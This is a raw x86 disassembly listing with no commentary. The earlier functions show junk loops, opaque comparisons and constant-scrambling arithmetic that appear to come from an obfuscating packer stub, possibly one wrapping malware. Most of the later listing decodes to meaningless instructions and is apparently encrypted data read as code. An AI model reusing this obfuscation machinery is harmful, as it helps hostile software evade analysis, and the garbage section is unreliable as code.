  40c74f:	jne    0x40c71c
  40c755:	mov    ecx,DWORD PTR ds:0x42e313
  40c75b:	mov    ecx,DWORD PTR [ecx+0x198]
  40c761:	mov    DWORD PTR [ecx],eax
  40c763:	jmp    0x40c789
  40c768:	mov    ecx,DWORD PTR [ebp+0x18]
  40c76b:	cmp    ecx,0xf89c85b8
  40c771:	jne    0x40c789
  40c777:	push   eax
  40c778:	push   DWORD PTR [ebp+0x14]
  40c77b:	push   DWORD PTR [ebp+0x10]
  40c77e:	push   DWORD PTR [ebp+0xc]
  40c781:	push   DWORD PTR [ebp+0x8]
  40c784:	call   0x409ed5
  40c789:	pop    edi
  40c78a:	pop    esi
  40c78b:	leave  
  40c78c:	ret    0x14
  40c78f:	push   ebp
  40c790:	mov    ebp,esp
  40c792:	sub    esp,0xc
  40c795:	push   esi
  40c796:	mov    esi,DWORD PTR ds:0x41ac40
  40c79c:	mov    ecx,DWORD PTR ds:0x41abdd
  40c7a2:	sub    esi,ecx
  40c7a4:	xor    esi,DWORD PTR [esi+ecx*1]
  40c7a7:	mov    esi,0xf89c85b9
  40c7ac:	sub    ecx,edx
  40c7ae:	mov    DWORD PTR [ebp-0x8],esi
  40c7b1:	sub    DWORD PTR ds:0x42b010,edi
  40c7b7:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  40c7be:	and    DWORD PTR ds:0x42901c,0x0
  40c7c8:	mov    edx,DWORD PTR ds:0x42901c
  40c7ce:	inc    edx
  40c7cf:	mov    DWORD PTR ds:0x42901c,edx
  40c7d5:	cmp    DWORD PTR ds:0x42901c,0x24
  40c7dc:	jne    0x40c7ed
  40c7e2:	push   0x42e127
  40c7e7:	call   DWORD PTR ds:0x42e9cb
  40c7ed:	cmp    DWORD PTR ds:0x42901c,0x18
  40c7f4:	jb     0x40c7c8
  40c7fa:	push   edi
  40c7fb:	mov    eax,eax
  40c7fd:	mov    eax,DWORD PTR [ebp-0x4]
  40c800:	mov    edi,DWORD PTR [ebp-0x8]
  40c803:	mov    ecx,0x7510899
  40c808:	xor    eax,ecx
  40c80a:	sub    edx,0x2378
  40c810:	xor    edi,ecx
  40c812:	adc    DWORD PTR ds:0x429020,0x74b2
  40c81c:	mov    edx,0x3272e0
  40c821:	mov    DWORD PTR ds:0x42901c,0x186b
  40c82b:	add    edi,edx
  40c82d:	add    eax,edx
  40c82f:	imul   eax,edi
  40c832:	mov    DWORD PTR ds:0x42b000,edi
  40c838:	mov    edi,DWORD PTR [ebp+0xc]
  40c83b:	cmp    edi,eax
  40c83d:	je     0x40c8c6
  40c843:	mov    DWORD PTR [ebp-0xc],esi
  40c846:	mov    eax,DWORD PTR [ebp-0xc]
  40c849:	sbb    DWORD PTR ds:0x42b008,0x2a28
  40c853:	mov    esi,DWORD PTR [ebp+0xc]
  40c856:	sub    DWORD PTR ds:0x42b010,0xd18
  40c860:	xor    eax,ecx
  40c862:	lea    eax,[eax*8+0x1939778]
  40c869:	add    DWORD PTR ds:0x42c00c,0x2208
  40c873:	mov    eax,DWORD PTR [esi+eax*1]
  40c876:	mov    DWORD PTR [ebp+0xc],eax
  40c879:	not    esi
  40c87b:	mov    eax,DWORD PTR [ebp-0x4]
  40c87e:	mov    esi,DWORD PTR [ebp-0x8]
  40c881:	or     DWORD PTR ds:0x42d008,0x42c01c
  40c88b:	xor    eax,ecx
  40c88d:	xor    esi,ecx
  40c88f:	sbb    DWORD PTR ds:0x42a008,0x42d00c
  40c899:	add    esi,edx
  40c89b:	add    eax,edx
  40c89d:	imul   eax,esi
  40c8a0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8a3:	cmp    esi,eax
  40c8a5:	je     0x40c8c6
  40c8ab:	mov    eax,DWORD PTR [ebp-0x4]
  40c8ae:	xor    eax,ecx
  40c8b0:	mov    ecx,DWORD PTR [ebp+0xc]
  40c8b3:	add    eax,edx
  40c8b5:	imul   eax,ecx
  40c8b8:	add    eax,DWORD PTR [ebp+0x8]
  40c8bb:	mov    DWORD PTR [ebp+0xc],eax
  40c8be:	mov    eax,DWORD PTR [ebp+0xc]
  40c8c1:	jmp    0x40c8d7
  40c8c6:	mov    eax,DWORD PTR [ebp-0x4]
  40c8c9:	mov    esi,DWORD PTR [ebp-0x8]
  40c8cc:	xor    esi,ecx
  40c8ce:	xor    eax,ecx
  40c8d0:	add    esi,edx
  40c8d2:	add    eax,edx
  40c8d4:	imul   eax,esi
  40c8d7:	pop    edi
  40c8d8:	pop    esi
  40c8d9:	leave  
  40c8da:	ret    0x8
  40c8dd:	push   ebp
  40c8de:	mov    ebp,esp
  40c8e0:	push   ecx
  40c8e1:	add    edx,edx
  40c8e3:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  40c8ea:	adc    ecx,eax
  40c8ec:	mov    eax,DWORD PTR [ebp-0x4]
  40c8ef:	mov    edx,DWORD PTR [ebp+0x10]
  40c8f2:	mov    DWORD PTR ds:0x42b000,0x1c
  40c8fc:	cmp    DWORD PTR ds:0x42b000,0x0
  40c903:	je     0x40c957
  40c909:	cmp    DWORD PTR ds:0x42b000,0x8
  40c910:	jne    0x40c921
  40c916:	push   0x42c000
  40c91b:	call   DWORD PTR ds:0x42e9d3
  40c921:	cmp    DWORD PTR ds:0x42b000,0x9
  40c928:	jne    0x40c93b
  40c92e:	mov    ecx,DWORD PTR ds:0x42b000
  40c934:	dec    ecx
  40c935:	mov    DWORD PTR ds:0x42b000,ecx
  40c93b:	mov    ecx,DWORD PTR ds:0x42b000
  40c941:	dec    ecx
  40c942:	mov    DWORD PTR ds:0x42b000,ecx
  40c948:	jmp    0x40c8fc
  40c94d:	and    DWORD PTR ds:0x42c000,0x7708
  40c957:	mov    ecx,0x7510899
  40c95c:	xor    eax,ecx
  40c95e:	xor    DWORD PTR ds:0x42a018,0x429008
  40c968:	add    eax,0x3272e0
  40c96d:	mov    DWORD PTR [edx],eax
  40c96f:	mov    DWORD PTR ds:0x429018,0x10
  40c979:	cmp    DWORD PTR ds:0x429018,0x0
  40c980:	je     0x40c9d0
  40c986:	cmp    DWORD PTR ds:0x429018,0x4
  40c98d:	jne    0x40c9a8
  40c993:	push   0x42b008
  40c998:	push   0x429024
  40c99d:	push   0x42d000
  40c9a2:	call   DWORD PTR ds:0x42e993
  40c9a8:	cmp    DWORD PTR ds:0x429018,0x5
  40c9af:	jne    0x40c9c0
  40c9b5:	mov    eax,ds:0x429018
  40c9ba:	dec    eax
  40c9bb:	mov    ds:0x429018,eax
  40c9c0:	mov    eax,ds:0x429018
  40c9c5:	dec    eax
  40c9c6:	mov    ds:0x429018,eax
  40c9cb:	jmp    0x40c979
  40c9d0:	mov    eax,DWORD PTR [ebp+0xc]
  40c9d3:	xor    eax,ecx
  40c9d5:	push   esi
  40c9d6:	mov    esi,DWORD PTR [ebp+0x10]
  40c9d9:	mov    edx,0x3272e0
  40c9de:	add    eax,edx
  40c9e0:	mov    DWORD PTR [esi+0x4],eax
  40c9e3:	mov    eax,DWORD PTR [ebp+0x14]
  40c9e6:	mov    esi,DWORD PTR [ebp+0x10]
  40c9e9:	mov    DWORD PTR [esi+0x8],eax
  40c9ec:	mov    eax,DWORD PTR [ebp+0x18]
  40c9ef:	mov    esi,DWORD PTR [ebp+0x10]
  40c9f2:	mov    DWORD PTR [esi+0xc],eax
  40c9f5:	mov    eax,DWORD PTR [ebp+0x1c]
  40c9f8:	mov    esi,DWORD PTR [ebp+0x10]
  40c9fb:	mov    DWORD PTR [esi+0x10],eax
  40c9fe:	mov    eax,DWORD PTR [ebp+0x8]
  40ca01:	xor    eax,ecx
  40ca03:	add    eax,edx
  40ca05:	pop    esi
  40ca06:	leave  
  40ca07:	ret    0x18
  40ca0a:	push   ebp
  40ca0b:	mov    ebp,esp
  40ca0d:	sub    esp,0x9c
  40ca13:	mov    ecx,DWORD PTR [ebp+0x8]
  40ca16:	mov    DWORD PTR ds:0x429004,0x1d
  40ca20:	cmp    DWORD PTR ds:0x429004,0x0
  40ca27:	je     0x40cae1
  40ca2d:	cmp    DWORD PTR ds:0x429004,0x2
  40ca34:	jne    0x40ca4b
  40ca3a:	push   DWORD PTR [ebp-0x10]
  40ca3d:	push   DWORD PTR [ebp-0x24]
  40ca40:	push   0x1cdf
  40ca45:	call   DWORD PTR ds:0x42e997
  40ca4b:	cmp    DWORD PTR ds:0x429004,0x3
  40ca52:	jne    0x40ca66
  40ca58:	xor    eax,eax
  40ca5a:	add    eax,DWORD PTR ds:0x429004
  40ca60:	dec    eax
  40ca61:	mov    ds:0x429004,eax
  40ca66:	xor    eax,eax
  40ca68:	add    eax,DWORD PTR ds:0x429004
  40ca6e:	dec    eax
  40ca6f:	mov    ds:0x429004,eax
  40ca74:	jmp    0x40ca20
  40ca79:	and    DWORD PTR ds:0x42b00c,0x0
  40ca83:	mov    eax,ds:0x42b00c
  40ca88:	inc    eax
  40ca89:	mov    ds:0x42b00c,eax
  40ca8e:	cmp    DWORD PTR ds:0x42b00c,0x6
  40ca95:	jne    0x40cabc
  40ca9b:	push   DWORD PTR [ebp-0x28]
  40ca9e:	push   DWORD PTR [ebp-0xc]
  40caa1:	push   0x42b000
  40caa6:	push   DWORD PTR [ebp-0x20]
  40caa9:	push   0x567e
  40caae:	push   0x641c
  40cab3:	push   DWORD PTR [ebp-0x24]
  40cab6:	call   DWORD PTR ds:0x42e99f
  40cabc:	cmp    DWORD PTR ds:0x42b00c,0x5
  40cac3:	jne    0x40cad4
  40cac9:	mov    eax,ds:0x42b00c
  40cace:	inc    eax
  40cacf:	mov    ds:0x42b00c,eax
  40cad4:	cmp    DWORD PTR ds:0x42b00c,0x15
  40cadb:	jb     0x40ca83
  40cae1:	mov    eax,0x8a8c
  40cae6:	xor    ax,WORD PTR [ecx+0x20]
  40caea:	and    DWORD PTR ds:0x42c008,0x0
  40caf4:	jmp    0x40cb08
  40caf9:	xor    ecx,ecx
  40cafb:	or     ecx,DWORD PTR ds:0x42c008
  40cb01:	inc    ecx
  40cb02:	mov    DWORD PTR ds:0x42c008,ecx
  40cb08:	cmp    DWORD PTR ds:0x42c008,0x14
  40cb0f:	jae    0x40cb9f
  40cb15:	cmp    DWORD PTR ds:0x42c008,0x18
  40cb1c:	jne    0x40cb3d
  40cb22:	push   0x42d00c
  40cb27:	push   DWORD PTR [ebp-0x24]
  40cb2a:	push   0x42e0d9
  40cb2f:	push   0x627f
  40cb34:	push   DWORD PTR [ebp-0x1c]
  40cb37:	call   DWORD PTR ds:0x42e9a3
  40cb3d:	jmp    0x40caf9
  40cb42:	mov    DWORD PTR ds:0x42c010,0x15
  40cb4c:	cmp    DWORD PTR ds:0x42c010,0x0
  40cb53:	je     0x40cb9f
  40cb59:	cmp    DWORD PTR ds:0x42c010,0xa
  40cb60:	jne    0x40cb71
  40cb66:	push   0x42a000
  40cb6b:	call   DWORD PTR ds:0x42e9ab
  40cb71:	cmp    DWORD PTR ds:0x42c010,0xb
  40cb78:	jne    0x40cb8d
  40cb7e:	xor    ecx,ecx
  40cb80:	xor    ecx,DWORD PTR ds:0x42c010
  40cb86:	dec    ecx
  40cb87:	mov    DWORD PTR ds:0x42c010,ecx
  40cb8d:	mov    ecx,DWORD PTR ds:0x42c010
  40cb93:	dec    ecx
  40cb94:	mov    DWORD PTR ds:0x42c010,ecx
  40cb9a:	jmp    0x40cb4c
  40cb9f:	mov    ecx,0x3b50
  40cba4:	sub    DWORD PTR ds:0x42900c,0x429000
  40cbae:	add    ax,cx
  40cbb1:	movzx  eax,ax
  40cbb4:	mov    DWORD PTR ds:0x42b000,0x10
  40cbbe:	cmp    DWORD PTR ds:0x42b000,0x0
  40cbc5:	je     0x40cc00
  40cbcb:	cmp    DWORD PTR ds:0x42b000,0x17
  40cbd2:	jne    0x40cbee
  40cbd8:	push   0x898b
  40cbdd:	push   DWORD PTR [ebp-0x10]
  40cbe0:	push   0x429018
  40cbe5:	push   DWORD PTR [ebp-0xc]
  40cbe8:	call   DWORD PTR ds:0x42e9af
  40cbee:	mov    ecx,DWORD PTR ds:0x42b000
  40cbf4:	dec    ecx
  40cbf5:	mov    DWORD PTR ds:0x42b000,ecx
  40cbfb:	jmp    0x40cbbe
  40cc00:	mov    DWORD PTR [ebp-0x10],eax
  40cc03:	movzx  ecx,BYTE PTR ds:0x42d010
  40cc0a:	or     ecx,DWORD PTR ds:0x42a014
  40cc10:	mov    DWORD PTR ds:0x42d010,ecx
  40cc16:	mov    BYTE PTR [ebp-0x1],0x79
  40cc1a:	lea    eax,[ebp-0x1]
  40cc1d:	and    ecx,DWORD PTR ds:0x42b014
  40cc23:	mov    DWORD PTR [ebp-0xc],eax
  40cc26:	xor    DWORD PTR ds:0x42a00c,edx
  40cc2c:	jmp    0x40efb2
  40cc31:	mov    esp,0xfb9ef6c5
  40cc36:	lea    edx,[ebx+ecx*8+0x3e7be512]
  40cc3d:	pop    ecx
  40cc3e:	cdq    
  40cc3f:	cmp    DWORD PTR [esi+0x7a7ae5f8],ebp
  40cc45:	add    DWORD PTR [edi+0x7a],ebx
  40cc48:	jp     0x40cbd7
  40cc4a:	mov    eax,ds:0xa51b3fe0
  40cc4f:	sub    eax,0xaaa6ccd3
  40cc54:	clc    
  40cc55:	pop    ebx
  40cc56:	xchg   ebx,eax
  40cc57:	xor    BYTE PTR ds:0x92cd0dda,cl
  40cc5d:	pop    ss
  40cc5e:	repnz lds eax,FWORD PTR ds:0xd66711c9
  40cc65:	cli    
  40cc66:	stc    
  40cc67:	add    al,0xb4
  40cc69:	cmc    
  40cc6a:	retf   0x67a1
  40cc6d:	ja     0x40cc3f
  40cc6f:	sahf   
  40cc70:	or     al,0x89
  40cc72:	mov    ds:0xabbb4d55,eax
  40cc77:	pop    eax
  40cc78:	jmp    FWORD PTR ds:0x702a510b
  40cc7e:	inc    ecx
  40cc7f:	sbb    al,0x8d
  40cc81:	or     dh,dh
  40cc83:	in     al,dx
  40cc84:	jg     0x40cc1a
  40cc86:	inc    ecx
  40cc87:	mov    ecx,0xc7753d04
  40cc8c:	pop    esi
  40cc8d:	aaa    
  40cc8e:	sub    BYTE PTR [ecx+0x33],ch
  40cc91:	aam    0x6e
  40cc93:	jne    0x40ccab
  40cc95:	pusha  
  40cc96:	or     DWORD PTR [edi+0xdc1ee44],edi
  40cc9c:	popa   
  40cc9d:	push   cs
  40cc9e:	lods   eax,DWORD PTR ds:[esi]
  40cc9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cca0:	sub    edx,DWORD PTR [eax+eax*8]
  40cca3:	frstor [esi+edx*8-0x2f22b88c]
  40ccaa:	das    
  40ccab:	adc    ch,al
  40ccad:	pop    edx
  40ccae:	out    dx,eax
  40ccaf:	mov    esp,0x28022bf1
  40ccb4:	sub    esp,DWORD PTR [esi+0x7b64e453]
  40ccba:	sub    DWORD PTR [ebp+esi*8-0x77],edi
  40ccbe:	or     ah,BYTE PTR [ebp-0x19]
  40ccc1:	ins    DWORD PTR es:[edi],dx
  40ccc2:	xchg   DWORD PTR [edx+0x2b],edi
  40ccc5:	ins    BYTE PTR es:[edi],dx
  40ccc6:	psubusb mm6,QWORD PTR [ebp-0x7d1310ae]
  40cccd:	sbb    esp,DWORD PTR [ebp-0x5a]
  40ccd0:	pop    ds
  40ccd1:	lods   al,BYTE PTR ds:[esi]
  40ccd2:	dec    edi
  40ccd3:	dec    ebp
  40ccd4:	mov    WORD PTR [ebp+ebp*2+0x75],ss
  40ccd8:	repnz add ebp,esp
  40ccdb:	nop
  40ccdc:	stos   BYTE PTR es:[edi],al
  40ccdd:	das    
  40ccde:	dec    edi
  40ccdf:	mov    ?,WORD PTR [eax*8-0x1fbb8b2]
  40cce6:	call   0x92a3:0x5361
  40ccec:	jo     0x40ccf0
  40ccee:	pop    esi
  40ccef:	pushf  
  40ccf0:	inc    ebx
  40ccf1:	dec    esi
  40ccf2:	push   ebp
  40ccf3:	cdq    
  40ccf4:	mov    esp,0x1b303f61
  40ccf9:	fild   WORD PTR [ebx]
  40ccfb:	mov    esp,DWORD PTR [edi]
  40ccfd:	mov    esi,0x26833c9a
  40cd02:	mov    esi,0xd9edfa5f
  40cd07:	jns    0x40cc96
  40cd09:	jecxz  0x40cc91
  40cd0b:	lock fcom QWORD PTR [ebx+0x7b1d59fd]
  40cd12:	shl    DWORD PTR [esi+ecx*8-0x2d35dff],cl
  40cd19:	jb     0x40cd29
  40cd1b:	dec    edi
  40cd1c:	mov    edi,0x5ad33f2e
  40cd21:	cmc    
  40cd22:	fld    QWORD PTR [edi+0x14]
  40cd25:	jle    0x40cd02
  40cd27:	mov    al,0x6a
  40cd29:	dec    edi
  40cd2a:	out    dx,al
  40cd2b:	or     DWORD PTR [ebp-0x6c6607cb],ebp
  40cd31:	sub    ebx,DWORD PTR [ecx]
  40cd33:	xlat   BYTE PTR ds:[ebx]
  40cd34:	push   es
  40cd35:	mov    dl,0x34
  40cd37:	je     0x40ccfb
  40cd39:	stos   BYTE PTR es:[edi],al
  40cd3a:	pop    ebx
  40cd3b:	addr16 dec edi
  40cd3d:	fcmovnbe st,st(7)
  40cd3f:	popa   
  40cd40:	mov    dl,0x4e
  40cd42:	int    0xd6
  40cd44:	pop    edi
  40cd45:	pop    esp
  40cd46:	mov    cs,WORD PTR [esp+eax*8+0x68]
  40cd4a:	arpl   WORD PTR [ebx],cx
  40cd4c:	mov    ecx,0x3dbb13fc
  40cd51:	fsubr  DWORD PTR [edi+0x7]
  40cd54:	cdq    
  40cd55:	jbe    0x40cda9
  40cd57:	cdq    
  40cd58:	lods   eax,DWORD PTR ds:[esi]
  40cd59:	scas   eax,DWORD PTR es:[edi]
  40cd5a:	aam    0x1
  40cd5c:	call   0xd192:0xa05d58a8
  40cd63:	out    0xca,eax
  40cd65:	cmp    eax,0x5f7a0df0
  40cd6a:	push   cs
  40cd6b:	and    eax,0xbfc8fff9
  40cd70:	rcl    BYTE PTR [edi+0x5],0x31
  40cd74:	or     al,0xde
  40cd76:	fsubr  QWORD PTR [edi+0x3764b6ac]
  40cd7c:	sub    ah,cl
  40cd7e:	popa   
  40cd7f:	out    dx,eax
  40cd80:	sub    ebx,edx
  40cd82:	xchg   BYTE PTR [ecx],ch
  40cd84:	inc    edi
  40cd85:	mov    ch,0xf0
  40cd87:	fincstp 
  40cd89:	mov    BYTE PTR [ecx-0x14],cl
  40cd8c:	push   ebp
  40cd8d:	cmp    DWORD PTR [eax-0x132b2c34],esi
  40cd93:	imul   ebx,ebp,0x865d04fa
  40cd99:	cdq    
  40cd9a:	imul   ebx,esi,0xfffffff5
  40cd9d:	dec    ebp
  40cd9e:	aam    0x18
  40cda0:	out    dx,al
  40cda1:	pop    ds
  40cda2:	sahf   
  40cda3:	div    BYTE PTR [ebx]
  40cda5:	xor    ch,BYTE PTR [edi-0x759a3902]
  40cdab:	pop    esi
  40cdac:	out    dx,eax
  40cdad:	loop   0x40cd49
  40cdaf:	fadd   QWORD PTR [esi-0x6c]
  40cdb2:	mov    esp,0x719887e9
  40cdb7:	or     BYTE PTR [ebp-0x5a5d963f],bl
  40cdbd:	out    dx,eax
  40cdbe:	and    bl,cl
  40cdc0:	sub    eax,0x6dcef36f
  40cdc5:	scas   al,BYTE PTR es:[edi]
  40cdc6:	xlat   BYTE PTR ds:[ebx]
  40cdc7:	mov    dl,0x73
  40cdc9:	sub    al,0xef
  40cdcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdcc:	mov    bh,0x8
  40cdce:	fsubr  st(4),st
  40cdd0:	pop    ebx
  40cdd1:	leave  
  40cdd2:	bswap  edx
  40cdd4:	xchg   esp,eax
  40cdd5:	inc    edi
  40cdd6:	jge    0x40ce25
  40cdd8:	mov    DWORD PTR [esp+ebp*4+0x3017379c],esi
  40cddf:	push   ebp
  40cde0:	sti    
  40cde1:	mov    bl,0x63
  40cde3:	pop    esp
  40cde4:	push   cs
  40cde5:	mov    ds:0xe2314128,al
  40cdea:	sti    
  40cdeb:	or     BYTE PTR [edi+0x2dba59c3],cl
  40cdf1:	data16 jns 0x40cdba
  40cdf4:	icebp  
  40cdf5:	out    dx,eax
  40cdf6:	leave  
  40cdf7:	stos   DWORD PTR es:[edi],eax
  40cdf8:	dec    ebp
  40cdf9:	sub    DWORD PTR [edx+0x34],0xffffffb9
  40cdfd:	mov    dl,0xa6
  40cdff:	sbb    bl,cl
  40ce01:	rcr    DWORD PTR [ebx],cl
  40ce03:	stos   BYTE PTR es:[edi],al
  40ce04:	cld    
  40ce05:	pop    ss
  40ce06:	shl    cl,cl
  40ce08:	hlt    
  40ce09:	adc    DWORD PTR [edx-0x75],esp
  40ce0c:	movnti DWORD PTR [ebx+0x3f9cc68d],eax
  40ce13:	cmp    DWORD PTR [edi-0x1ce018bc],ebx
  40ce19:	shl    DWORD PTR [edi+eiz*2],0xe0
  40ce1d:	mov    ecx,0x87d4204b
  40ce22:	popf   
  40ce23:	in     al,dx
  40ce24:	cmp    eax,0x126153f1
  40ce29:	xchg   ebp,eax
  40ce2a:	sub    eax,0x2ce99eb9
  40ce2f:	jae    0x40ce0b
  40ce31:	out    dx,eax
  40ce32:	sar    DWORD PTR [edx+0x26214fa6],0x1d
  40ce39:	adc    eax,0x303aa7f5
  40ce3e:	pop    edi
  40ce3f:	ret    0x1b4e
  40ce42:	push   esi
  40ce43:	mov    dl,0x18
  40ce45:	cmp    dl,BYTE PTR [eax]
  40ce47:	cld    
  40ce48:	pop    ss
  40ce49:	hlt    
  40ce4a:	push   esi
  40ce4b:	fs fsubrp st(6),st
  40ce4e:	shr    BYTE PTR [ecx+0x54e37b54],cl
  40ce54:	loopne 0x40ce9e
  40ce56:	xchg   ecx,eax
  40ce57:	sahf   
  40ce58:	xor    eax,0x9999424
  40ce5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce5e:	and    al,0xac
  40ce60:	pop    esi
  40ce61:	push   ebx
  40ce62:	push   es
  40ce63:	cdq    
  40ce64:	dec    DWORD PTR [edi-0xee9e76c]
  40ce6a:	jb     0x40ce2e
  40ce6c:	mov    ah,0x39
  40ce6e:	dec    esi
  40ce6f:	mov    ?,WORD PTR [esi+0x64]
  40ce72:	xor    bh,BYTE PTR [edi]
  40ce74:	cmp    ecx,DWORD PTR [edx-0x51889a36]
  40ce7a:	outs   dx,DWORD PTR ds:[esi]
  40ce7b:	mov    ebx,0xe2b09cb7
  40ce80:	leave  
  40ce81:	clc    
  40ce82:	out    0xc3,eax
  40ce84:	lea    ebp,[edx+0xd6e08e4]
  40ce8a:	sar    BYTE PTR [eax],0x4d
  40ce8d:	sbb    cl,BYTE PTR es:[eax+0x457ed377]
  40ce94:	sub    eax,0x2e2458fd
  40ce99:	push   ss
  40ce9a:	mov    eax,0x38e6dfd4
  40ce9f:	mov    WORD PTR [eax+0x57dffb6d],?
  40cea5:	mov    bh,cl
  40cea7:	and    BYTE PTR [ebx-0x7ed7826a],0x1a
  40ceae:	mov    al,ds:0xe7230c97
  40ceb3:	mov    WORD PTR [ecx+eiz*1],cs
  40ceb6:	add    esp,DWORD PTR [ecx+0x5f]
  40ceb9:	out    dx,al
  40ceba:	call   0x593f059
  40cebf:	inc    edi
  40cec0:	in     eax,0x47
  40cec2:	pop    esp
  40cec3:	jg     0x40cf30
  40cec5:	aad    0xed
  40cec7:	fdivr  QWORD PTR [esi+0x4e]
  40ceca:	out    dx,eax
  40cecb:	in     al,dx
  40cecc:	pop    es
  40cecd:	retf   0x11d3
  40ced0:	mov    eax,ds:0xa6adfb9d
  40ced5:	dec    ebp
  40ced6:	push   edi
  40ced7:	inc    edx
  40ced8:	enter  0xc543,0x47
  40cedc:	mov    esp,0x867a7467
  40cee1:	sub    al,0xcd
  40cee3:	mov    WORD PTR [ebx],?
  40cee5:	and    BYTE PTR [edi+0x71],al
  40cee8:	ret    0xd2ac
  40ceeb:	mov    dh,0x43
  40ceed:	add    al,0xc0
  40ceef:	push   es
  40cef0:	push   esp
  40cef1:	push   esp
  40cef2:	cdq    
  40cef3:	or     ebp,DWORD PTR [edx]
  40cef5:	jbe    0x40ceca
  40cef7:	add    DWORD PTR [edx],0xffffff85
  40cefa:	pop    ebx
  40cefb:	sbb    dl,ah
  40cefd:	jmp    0xf3d875ee
  40cf02:	jae    0x40ced8
  40cf04:	stos   DWORD PTR es:[edi],eax
  40cf05:	jb     0x40cf59
  40cf07:	sbb    BYTE PTR [ebp+0x19],ch
  40cf0a:	test   DWORD PTR [esi-0x51828bc3],edx
  40cf10:	popf   
  40cf11:	shl    BYTE PTR ds:0x40227484,cl
  40cf17:	pop    esp
  40cf18:	pop    edi
  40cf19:	loope  0x40cf2c
  40cf1b:	add    al,BYTE PTR ds:0x211b9898
  40cf21:	lea    esi,[ecx+0x6f]
  40cf24:	(bad)  
  40cf25:	dec    edx
  40cf26:	fistp  QWORD PTR [ebx]
  40cf28:	aam    0x1f
  40cf2a:	xchg   esp,eax
  40cf2b:	adc    ecx,DWORD PTR [ebx+0x2816d2f9]
  40cf31:	jmp    0x44e8d985
  40cf36:	inc    edi
  40cf37:	imul   ebp,DWORD PTR [ecx],0xc
  40cf3a:	seto   BYTE PTR [ecx-0x19]
  40cf3e:	jle    0x40cec9
  40cf40:	or     dl,dh
  40cf42:	xchg   BYTE PTR [edi+0x32990325],dl
  40cf48:	sbb    DWORD PTR [ecx+0x46],0x25
  40cf4c:	add    al,0x1c
  40cf4e:	addr16 push ecx
  40cf50:	loop   0x40cf9c
  40cf52:	ins    BYTE PTR es:[edi],dx
  40cf53:	mov    eax,0x1353eae8
  40cf58:	and    DWORD PTR [eax],0xc2783c53
  40cf5e:	mov    eax,ds:0x8ec64c85
  40cf63:	aam    0xb9
  40cf65:	sbb    edi,edi
  40cf67:	scas   al,BYTE PTR es:[edi]
  40cf68:	or     DWORD PTR [edi-0x7d97d7fe],ecx
  40cf6e:	xchg   esp,eax
  40cf6f:	je     0x40cf99
  40cf71:	test   al,0xbd
  40cf73:	mul    DWORD PTR [edi+edx*4-0xc]
  40cf77:	es sub ebx,0x2e
  40cf7b:	and    BYTE PTR [ecx],bl
  40cf7d:	mov    ah,BYTE PTR [ebx-0x30]
  40cf80:	lahf   
  40cf81:	in     eax,dx
  40cf82:	jo     0x40cf13
  40cf84:	retf   
  40cf85:	adc    BYTE PTR [ebx+0x20ef2f7c],0x1b
  40cf8c:	loopne 0x40cf4a
  40cf8e:	out    0x67,eax
  40cf90:	xchg   edx,eax
  40cf91:	fimul  DWORD PTR [ebx+ecx*2+0x6f]
  40cf95:	jb     0x40cf83
  40cf97:	jge    0x40cf49
  40cf99:	daa    
  40cf9a:	popf   
  40cf9b:	pushf  
  40cf9c:	cmp    eax,0x76da7313
  40cfa1:	test   al,0xb8
  40cfa3:	adc    eax,0xde57a602
  40cfa8:	call   0x1328c43f
  40cfad:	xchg   BYTE PTR [edx+esi*8],al
  40cfb0:	mov    eax,ds:0xfdadccc1
  40cfb5:	xchg   edx,eax
  40cfb6:	dec    ebp
  40cfb7:	cli    
  40cfb8:	call   0xa40a:0x959f3e68
  40cfbf:	loopne 0x40cf8c
  40cfc1:	jmp    0xbc9e476e
  40cfc6:	lds    ebx,FWORD PTR [ebx+edx*2+0xc3bb700]
  40cfcd:	shr    BYTE PTR ds:0x1776c72c,1
  40cfd3:	or     DWORD PTR [ebx-0x3ff85776],ebx
  40cfd9:	push   ebx
  40cfda:	lds    eax,FWORD PTR [eax+0x4c9c007b]
  40cfe0:	fidivr DWORD PTR [ebx+0x69]
  40cfe3:	jg     0x40d02c
  40cfe5:	sub    al,0x3c
  40cfe7:	and    DWORD PTR [esi+ecx*1-0x22],ecx
  40cfeb:	pop    esp
  40cfec:	cmc    
  40cfed:	or     eax,0xea84a194
  40cff2:	aas    
  40cff3:	in     eax,dx
  40cff4:	mov    esp,0x3000ed1c
  40cff9:	stos   DWORD PTR es:[edi],eax
  40cffa:	cmc    
  40cffb:	xor    BYTE PTR ds:0xdbb2415a,0xb6
  40d002:	sub    eax,0xb10b39d7
  40d007:	ins    DWORD PTR es:[edi],dx
  40d008:	mov    edi,0x3eae8aa8
  40d00d:	xor    ebp,DWORD PTR [ebp-0x2754fc44]
  40d013:	mov    eax,0xad79a83b
  40d018:	psubusb mm6,mm7
  40d01b:	mov    dl,ch
  40d01d:	cmp    al,0x3
  40d01f:	mov    ecx,0x39e8d843
  40d024:	xlat   BYTE PTR ds:[ebx]
  40d025:	fidiv  WORD PTR [edi+0xa]
  40d028:	or     DWORD PTR [edx],edi
  40d02a:	out    0x5c,al
  40d02c:	cwde   
  40d02d:	pop    eax
  40d02e:	test   BYTE PTR [ebp-0x37],0x9c
  40d032:	adc    DWORD PTR [ebx-0x3c],edi
  40d035:	push   esi
  40d036:	aas    
  40d037:	retf   
  40d038:	sub    al,0x21
  40d03a:	dec    esi
  40d03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d03c:	adc    BYTE PTR ss:[ebp-0x15],dl
  40d040:	sbb    al,0x48
  40d042:	jmp    0x383d1490
  40d047:	out    dx,eax
  40d048:	aad    0xdc
  40d04a:	mov    eax,0x8f797373
  40d04f:	test   eax,0x3f51d2d1
  40d054:	jp     0x40d093
  40d056:	cmp    BYTE PTR [esi-0x67],cl
  40d059:	jp     0x40d0b0
  40d05b:	pop    eax
  40d05c:	(bad)  
  40d05d:	pop    edx
  40d05e:	(bad)  
  40d05f:	sti    
  40d060:	dec    edx
  40d061:	cdq    
  40d062:	pop    edi
  40d063:	push   eax
  40d064:	repz mov al,0x92
  40d067:	jle    0x40d010
  40d069:	ja     0x40d026
  40d06b:	inc    edi
  40d06c:	mov    ds:0xc1a7525f,al
  40d071:	mov    DWORD PTR [esi],esp
  40d073:	xchg   edx,eax
  40d074:	int3   
